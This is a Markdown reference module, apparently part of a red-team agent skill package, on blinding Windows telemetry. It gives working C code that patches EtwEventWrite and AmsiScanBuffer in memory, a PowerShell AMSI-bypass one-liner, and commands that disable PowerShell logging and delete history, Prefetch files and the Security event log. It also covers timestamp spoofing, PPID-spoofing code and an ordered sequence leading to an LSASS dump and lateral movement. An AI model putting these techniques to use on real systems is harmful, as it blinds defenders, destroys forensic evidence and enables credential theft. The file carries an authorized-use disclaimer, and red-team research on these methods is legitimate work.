# Telemetry blinding: ETW / AMSI / anti-forensics

> Use only for authorized red teams, adversary simulations, and owned-product testing. Do not use against unauthorized targets.

EDR detection depends heavily on ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface), two telemetry channels built into Windows.
This document summarizes red-team countermeasures for both channels and adds anti-forensics methods for Sysmon, PowerShell logging, and timestamps.

Map to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW internals

ETW is a high-performance event-tracing framework built into Windows. EDR uses it as lightweight kernel telemetry.
Red teams should focus on these providers:

| Provider GUID | Name | Used by |
|---------------|------|---------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading and JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key user-mode APIs

| API | DLL | Function |
|-----|-----|----------|
| `EtwEventWrite` | `ntdll.dll` | Write an event (most common) |
| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | Lower layer for EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | Control a trace session (start, stop, query provider) |
| `EtwEventEnabled` | `ntdll.dll` | Check whether a provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register a provider |

### Call chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → Kernel ETW core → consumer (EDR user-mode process subscribes to the session)
```

## 2. Three ETW patch methods

### Method A: EtwEventWrite head patch

Change the `ntdll!EtwEventWrite` entry to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Warning: VirtualProtect itself may be hooked. Use the indirect syscall version.
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: Writing ntdll memory itself creates ETW-TI `ALPC_MODIFY_PROCESS` / `PROTECTVM` events.
Use **indirect syscall + bypass the `NtProtectVirtualMemory` hook before patching**.
Otherwise, EDR receives the alert before the patch takes effect.

### Method B: EtwEventEnabled always false

More covert: Do not modify `EtwEventWrite`. Make `EtwEventEnabled` always return FALSE.
The application then sees that the provider is disabled and does not call `EtwEventWrite`. This is friendlier to memory-hash integrity checks because many EDR products check `EtwEventWrite` bytes.

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: Disable the provider with `NtTraceControl`

Use a syscall to close the EDR session directly. This is intrusive but does not modify ntdll bytes:

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher.
// Use after Local Admin + UAC bypass.
```

Use this less often because:

- Closing the session itself triggers an "ETW provider stopped" event that another channel can detect.
- It requires high privileges.

### Method D: Kernel ETW patch (only with existing BYOVD or kernel read/write)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
directly set to 0 so all ETW-TI events are discarded
```

This belongs to the BYOVD phase of `attack-chain`. This Skill does not cover it in depth.

## 3. AMSI bypass

AMSI is a Windows interface that scans scripts for viruses before PowerShell, .NET, WMI, or VBA executes them.
Red teams most often encounter PowerShell + AMSI.

### Classic AmsiScanBuffer patch

```c
// Write at the amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-line version (for detection research only; signatures and Defender block it):

```powershell
# Concept demonstration. A real environment requires obfuscation / HWBP.
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced method 1: Hardware breakpoint AMSI bypass

Do not modify amsi.dll memory, so integrity scanning does not trigger:

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry.
3. On a VEH hit, set `RAX = 0x80070057`, `RIP = ret instruction address`, and `RSP += 8`.
4. ContinueExecution.

Use the same infrastructure as the HWBP Blindside in unhook-techniques.md. Share the VEH.

### Advanced method 2: Corrupt `AmsiContext` / `AmsiSession`

Build a malformed `AmsiContext` structure. Make `AmsiScanBuffer` return success early after validation fails:

```text
// The AmsiContext header should contain the "AMSI" magic value.
// Change it to "XXXX" → AmsiScanBuffer validation fails but returns S_OK + AMSI_RESULT_CLEAN.
```

### Advanced method 3: Reflectively load a copy of amsi.dll

Do not use the system amsi.dll. Reflectively load a clean copy into the process and redirect PowerShell engine calls to AMSI.
Use this when an advanced EDR already intercepts PowerShell.exe startup during loading.

## 4. Anti-forensics: clear artifacts

### Disable PowerShell ScriptBlock Logging

```powershell
# Registry (requires administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear all entries (large action, use carefully)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL logs

```powershell
# Stop the session, then delete the ETL
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Warning: Directly deleting .evtx makes Event Log Service recreate it and write a "log cleared" event (Event ID 1102).
# More covert: Patch the EventLog API in wevtsvc.dll in memory (T1070.001).
```

### Timestamp spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evade Sysmon monitoring

Sysmon is the most common free community telemetry tool. Many enterprises use the olaf configuration.
Key events:

| Event ID | Meaning |
|----------|---------|
| 1 | ProcessCreate (including PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL load) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion methods

1. **Do not create a new process**: Operate inside an existing injected process and avoid Event ID 1.
2. **PPID spoof**: Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set PPID to `explorer.exe`, so Sysmon ProcessCreate looks legitimate.

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + do not modify the image**: New Sysmon versions capture Process Hollowing with Event ID 25.
   Prefer **module stomping** (overwrite a section of a loaded legitimate DLL) or newer methods such as **dirty vanity**.
   Use PPID spoofing with either technique.
4. **Do not use a remote thread**: Avoid Event ID 8. Use `NtCreateThreadEx` in your own process, APC, or Early Bird APC.
5. **Use DoH / HTTPS for DNS**: Avoid Event ID 22.

## 6. Call stack spoofing and timestamps make events look legitimate

When ProcessCreate cannot be avoided, such as when a child process must be spawned, you can:

- Change CommandLine to resemble a legitimate program.
- Spoof PPID to services.exe and appear as an SCM-started service.
- Change the ImageLoad image hash by using module stomping to place implant code in a signed DLL memory space.
- Use CallStackSpoofer. Sysmon cannot see implant frames even when EnableCallTracing is enabled.

## 7. Engagement OPSEC: operation order

**The wrong order lets EDR receive an alert first** and cuts off later actions.

Correct order:

```text
1. AMSI bypass (prefer HWBP to avoid writing amsi.dll)
   ─── Prevent scanning while .NET / PowerShell loads the implant.
2. ETW patch (patch EtwEventWrite before any syscall)
   ─── Disable telemetry for later actions.
3. Call NtProtectVirtualMemory through an indirect syscall.
   ─── Prepare a safe memory-permission change channel.
4. Unhook ntdll (Peruns Fart) or enable indirect syscall.
   ─── Remove user-mode hooks.
5. Set up call stack spoofing.
   ─── Prepare a forged stack for all later syscalls.
6. Execute the payload (injection / lateral movement / dump LSASS).
7. Clear artifacts (PowerShell history / Prefetch / timestamps).
```

Wrong order examples:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC receives the alert.
❌ Dump LSASS first → AMSI / ETW are not suppressed → high-confidence T1003.001 alert.
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing callback

After completing this three-part set (hook survey → unhook → telemetry blinding), return to Step 5 in `SKILL.md` and verify in the sandbox.
Then use the `initial access` and `lateral movement` sections in `attack-chain/` for the next phase.
